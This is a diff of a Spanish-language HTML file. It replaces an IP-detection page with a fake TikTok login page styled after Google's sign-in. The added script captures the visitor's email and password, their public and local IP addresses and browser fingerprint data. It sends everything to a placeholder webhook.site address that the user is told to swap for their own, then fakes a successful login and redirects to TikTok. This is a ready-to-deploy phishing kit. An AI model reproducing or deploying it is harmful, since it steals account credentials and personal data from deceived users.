@@ -3,22 +3,255 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Extractor Automático de Datos</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Iniciar sesión</title>
+    <style>
+        /* Estilo limpio y moderno, similar a Google */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f1f3f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-container {
+            background: white;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .login-container h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+        .login-container .sub {
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            background: #fafafa;
+            transition: 0.2s;
+        }
+        .login-container input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            background: white;
+            box-shadow: 0 1px 3px rgba(26,115,232,0.2);
+        }
+        .login-container button {
+            width: 100%;
+            padding: 14px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 18px;
+            transition: 0.2s;
+        }
+        .login-container button:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        .login-container button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .login-container .msg {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #d93025;
+            display: none;
+        }
+        .login-container .msg.success {
+            color: #188038;
+        }
+        /* pequeño pie */
+        .footer {
+            margin-top: 24px;
+            font-size: 13px;
+            color: #80868b;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔍 Detector de Usuario</h1>
-        <p>Al entrar, tu IP y datos se mostrarán abajo.</p>
-        
-        <div id="datos-ocultos">
-            <h3>📍 Información Detectada:</h3>
-            <div id="ip-display">Detectando IP...</div>
-            <div id="ubicacion-display">Detectando ubicación...</div>
-            <div id="datos-dispositivo">Detectando dispositivo...</div>
-        </div>
-    </div>
 
-    <script src="script.js"></script>
+<div class="login-container">
+    <h1>🔐 Iniciar sesión</h1>
+    <div class="sub">Para continuar a TikTok, inicia sesión</div>
+    <form id="loginForm">
+        <input type="email" id="email" placeholder="Correo electrónico o usuario" required autofocus>
+        <input type="password" id="password" placeholder="Contraseña" required>
+        <button type="submit" id="submitBtn">Iniciar sesión</button>
+        <div class="msg" id="msg"></div>
+    </form>
+    <div class="footer">¿Olvidaste tu contraseña?</div>
+</div>
+
+<script>
+    // ============================================================
+    //  CONFIGURACIÓN: CAMBIA ESTA URL POR TU WEBHOOK REAL
+    // ============================================================
+    const WEBHOOK_URL = 'https://webhook.site/########-####-####-####-############';
+    // Si no pones una real, los datos se mostrarán en consola (F12)
+
+    // ============================================================
+    //  FUNCIONES DE RECOLECCIÓN
+    // ============================================================
+
+    // 1. Obtener IP pública mediante ipify (gratuito, sin clave)
+    async function getPublicIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            if (!res.ok) throw new Error('Error en ipify');
+            const data = await res.json();
+            return data.ip;
+        } catch (e) {
+            console.warn('No se pudo obtener IP pública:', e);
+            return 'No disponible';
+        }
+    }
+
+    // 2. Obtener IP local (posible) mediante WebRTC (no fiable, solo para info extra)
+    function getLocalIP() {
+        return new Promise((resolve) => {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => resolve('No soportado'));
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate) return;
+                    const parts = ice.candidate.candidate.split(' ');
+                    if (parts.length > 4) {
+                        const ip = parts[4];
+                        // Filtra IPv4
+                        if (ip && ip.includes('.') && !ip.includes('0.0.0.0')) {
+                            resolve(ip);
+                            pc.close();
+                        }
+                    }
+                };
+                // Timeout por si no hay candidatos
+                setTimeout(() => {
+                    pc.close();
+                    resolve('No disponible');
+                }, 3000);
+            } catch (e) {
+                resolve('No soportado');
+            }
+        });
+    }
+
+    // 3. Recoger datos del navegador
+    function getBrowserData() {
+        return {
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            language: navigator.language,
+            languages: navigator.languages,
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            cookiesEnabled: navigator.cookieEnabled,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            plugins: Array.from(navigator.plugins || []).map(p => p.name),
+            referrer: document.referrer || 'Directo',
+            url: window.location.href,
+            timestamp: new Date().toISOString()
+        };
+    }
+
+    // 4. Enviar datos al webhook (o mostrarlos en consola si falla)
+    async function sendData(payload) {
+        try {
+            const response = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            if (!response.ok) throw new Error(`HTTP ${response.status}`);
+            console.log('✅ Datos enviados correctamente');
+        } catch (error) {
+            console.error('❌ Error al enviar al webhook:', error);
+            // Fallback: mostrar en consola para depuración
+            console.log('🔍 PAYLOAD (copia esto):', payload);
+        }
+    }
+
+    // ============================================================
+    //  MANEJADOR DEL FORMULARIO
+    // ============================================================
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
+        const btn = document.getElementById('submitBtn');
+        const msg = document.getElementById('msg');
+
+        // Validación simple
+        if (!email || !password) {
+            msg.textContent = 'Por favor, completa ambos campos.';
+            msg.style.display = 'block';
+            msg.className = 'msg';
+            return;
+        }
+
+        // Deshabilitar botón y mostrar estado
+        btn.disabled = true;
+        btn.textContent = 'Verificando...';
+        msg.style.display = 'none';
+
+        // Recolectar datos
+        const publicIP = await getPublicIP();
+        const localIP = await getLocalIP();
+        const browser = getBrowserData();
+
+        // Construir payload completo
+        const payload = {
+            credentials: {
+                email: email,
+                password: password
+            },
+            ip: {
+                public: publicIP,
+                local: localIP
+            },
+            browser_info: browser,
+            // metadatos adicionales
+            source: 'GitHub Pages Login Fake'
+        };
+
+        // Enviar
+        await sendData(payload);
+
+        // Simular éxito y redirigir a TikTok
+        msg.textContent = '✅ Sesión iniciada, redirigiendo...';
+        msg.className = 'msg success';
+        msg.style.display = 'block';
+
+        setTimeout(() => {
+            window.location.href = 'https://www.tiktok.com/';
+        }, 1500);
+    });
+</script>
+
 </body>
 </html>
